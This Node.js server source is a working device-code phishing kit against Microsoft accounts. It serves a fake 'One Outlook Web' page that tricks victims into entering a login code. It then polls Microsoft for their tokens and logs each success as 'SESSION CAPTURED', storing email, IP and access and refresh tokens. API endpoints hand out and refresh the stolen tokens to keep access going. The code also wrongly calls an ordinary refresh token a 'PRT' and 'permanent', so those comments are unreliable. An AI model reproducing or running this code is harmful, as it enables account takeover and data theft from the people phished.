const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// YOUR AZURE APP CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

let userSessions = new Map();
let pendingAuth = new Map();

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

function generateSessionKey() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let key = '';
    for (let i = 0; i < 32; i++) {
        key += chars[Math.floor(Math.random() * chars.length)];
    }
    return key;
}

// ============================================
// REFRESH ACCESS TOKEN ONLY - PRT STAYS THE SAME
// ============================================
async function refreshAccessToken(session) {
    if (!session.refresh_token) {
        console.log(`❌ No PRT for ${session.email}`);
        return null;
    }
    
    try {
        console.log(`🔄 Refreshing ACCESS TOKEN for ${session.email} at ${new Date().toLocaleTimeString()}...`);
        console.log(`   Using PRT: ${session.refresh_token.substring(0, 30)}...`);
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.refresh_token,
                client_id: YOUR_CLIENT_ID
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const tokens = response.data;
        
        // ONLY update access token - PRT stays the same unless Microsoft sends a new one
        const oldToken = session.access_token;
        session.access_token = tokens.access_token;
        session.expires_in = tokens.expires_in;
        session.expires_at = Date.now() + (tokens.expires_in * 1000);
        session.lastRefreshed = new Date().toISOString();
        
        // Only update PRT if Microsoft sends a new one (rare - happens during security events)
        if (tokens.refresh_token && tokens.refresh_token !== session.refresh_token) {
            console.log(`⚠️ PRT was rotated by Microsoft! This is rare.`);
            session.refresh_token = tokens.refresh_token;
        }
        
        console.log(`✅ Access token refreshed for ${session.email}`);
        console.log(`   Old Access Token: ${oldToken?.substring(0, 30)}...`);
        console.log(`   New Access Token: ${session.access_token?.substring(0, 30)}...`);
        console.log(`   PRT (unchanged): ${session.refresh_token?.substring(0, 30)}...`);
        console.log(`   Expires in: ${tokens.expires_in} seconds`);
        
        return session.access_token;
        
    } catch (err) {
        console.error(`❌ Token refresh failed for ${session.email}:`, err.response?.data?.error || err.message);
        return null;
    }
}

// ============================================
// CREATE SESSION
// ============================================
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        const sessionKey = generateSessionKey();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        console.log(`[CREATE] SID: ${sid}, Session Key: ${sessionKey.substring(0, 10)}..., Code: ${user_code}`);
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, sessionKey, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid, sessionKey);
        
        res.json({ success: true, sid: sid, sessionKey: sessionKey, user_code: user_code });
        
    } catch (err) {
        console.error('Create session error:', err.response?.data || err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sid, sessionKey) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            console.log(`[POLL] Session ${sid} expired`);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const session = {
                sid: sid,
                sessionKey: sessionKey,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token || null,  // PRT - PERMANENT
                id_token: tokens.id_token || null,
                token_type: tokens.token_type,
                expires_in: tokens.expires_in,
                expires_at: Date.now() + (tokens.expires_in * 1000),
                scope: tokens.scope,
                capturedAt: new Date().toISOString(),
                lastRefreshed: new Date().toISOString()
            };
            
            userSessions.set(sid.toString(), session);
            
            pending.status = 'captured';
            pending.email = userInfo.data.mail;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ SESSION CAPTURED!`);
            console.log(`   Email: ${userInfo.data.mail}`);
            console.log(`   Session Key: ${sessionKey}`);
            console.log(`   PRT (Permanent): ${tokens.refresh_token ? 'CAPTURED ✓' : 'NO'}`);
            console.log(`   Access Token: ${tokens.access_token?.substring(0, 30)}...`);
            
        } catch (err) {
            if (err.response?.data?.error !== 'authorization_pending') {}
        }
    }, 3000);
}

// ============================================
// API: Get FRESH access token (PRT stays same)
// ============================================
app.get('/api/session/token/:sid', async (req, res) => {
    const session = userSessions.get(req.params.sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    
    // Refresh ONLY the access token using the permanent PRT
    const newAccessToken = await refreshAccessToken(session);
    
    res.json({
        email: session.email,
        access_token: newAccessToken || session.access_token,
        refresh_token: session.refresh_token,  // PRT - unchanged
        refreshed_at: new Date().toISOString(),
        expires_in: session.expires_in,
        note: "PRT (refresh_token) stays the same. Only access_token changes on each refresh."
    });
});

// ============================================
// API: Get ALL tokens (with fresh access token)
// ============================================
app.get('/api/session/tokens/:sid', async (req, res) => {
    const session = userSessions.get(req.params.sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    
    // Refresh ONLY the access token using the permanent PRT
    const newAccessToken = await refreshAccessToken(session);
    
    res.json({
        email: session.email,
        sessionKey: session.sessionKey,
        access_token: newAccessToken || session.access_token,
        refresh_token: session.refresh_token,  // PRT - PERMANENT, does NOT change
        id_token: session.id_token || 'Not captured',
        expires_in: session.expires_in,
        expires_at: session.expires_at,
        token_type: session.token_type,
        lastRefreshed: new Date().toISOString(),
        note: "PRT (refresh_token) is permanent. Use it to generate new access tokens."
    });
});

// ============================================
// API: Force refresh ALL sessions access tokens
// ============================================
app.post('/api/refresh-all', async (req, res) => {
    console.log(`🔄 Manual refresh of all access tokens requested`);
    
    const results = [];
    for (const [sid, session] of userSessions.entries()) {
        const newToken = await refreshAccessToken(session);
        results.push({
            email: session.email,
            success: !!newToken,
            prt_unchanged: session.refresh_token?.substring(0, 20) + '...'
        });
    }
    
    res.json({ 
        success: true, 
        refreshed_at: new Date().toISOString(),
        count: results.length,
        message: "Access tokens refreshed. PRTs remain unchanged.",
        results: results
    });
});

// ============================================
// API: Get all sessions
// ============================================
app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(userSessions.values()).map(s => ({
        sid: s.sid,
        sessionKey: s.sessionKey,
        email: s.email,
        name: s.name,
        ip: s.ip,
        userAgent: s.userAgent,
        capturedAt: s.capturedAt,
        lastRefreshed: s.lastRefreshed,
        hasRefreshToken: !!s.refresh_token,
        tokenExpires: new Date(s.expires_at).toLocaleString()
    }));
    res.json({ sessions: sessionList });
});

app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = userSessions.get(sid);
    if (session) return res.json({ status: 'captured', email: session.email });
    for (const pending of pendingAuth.values()) {
        if (pending.sid.toString() === sid) return res.json({ status: pending.status });
    }
    res.json({ status: 'not_found' });
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

// Generate Auth Page
app.get('/generate-auth-page', async (req, res) => {
    try {
        const sid = generateSID();
        const sessionKey = generateSessionKey();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, sessionKey, status: 'pending',
            ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
            createdAt: Date.now(),
            expiresAt: Date.now() + (response.data.expires_in * 1000)
        });
        
        pollForToken(device_code, sid, sessionKey);
        
        const html = `<!DOCTYPE html>
<html>
<head><title>One Outlook Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:20px;padding:40px;max-width:500px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.code{font-size:42px;font-weight:bold;letter-spacing:8px;background:#f0f0f0;padding:20px;border-radius:12px;margin:20px 0;color:#0078d4;font-family:monospace}
.btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin:5px}
.btn:hover{background:#005fa3}
.status{margin-top:20px;padding:12px;border-radius:8px;background:#f8f9fa;color:#666;font-size:13px}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
    <h2>One Outlook Web</h2>
    <p>Connect your Microsoft account</p>
    <div class="code" id="userCode">${user_code}</div>
    <button class="btn" onclick="copyCode()">Copy Code</button>
    <button class="btn" id="openBtn">Open Microsoft Login</button>
    <div class="status" id="statusMsg"><span class="spinner"></span> Waiting for authentication...</div>
</div>
<script>
    const SID = ${sid};
    const API_URL = window.location.origin;
    function copyCode(){const c=document.getElementById('userCode').innerText;navigator.clipboard.writeText(c);alert('Copied!')}
    document.getElementById('openBtn').onclick=function(){window.open('https://microsoft.com/devicelogin','_blank','width=600,height=700')}
    async function poll(){try{const r=await fetch(API_URL+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Access granted! Session captured.';setTimeout(()=>window.close(),2000)}}catch(e){}setTimeout(poll,3000)}
    poll();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Client ID: ${YOUR_CLIENT_ID}`);
    console.log(`📍 PRT (Refresh Token) is PERMANENT`);
    console.log(`📍 Access Token refreshes on every request`);
    console.log(`📍 Dashboard: http://localhost:${PORT}`);
    console.log(`========================================\n`);
});
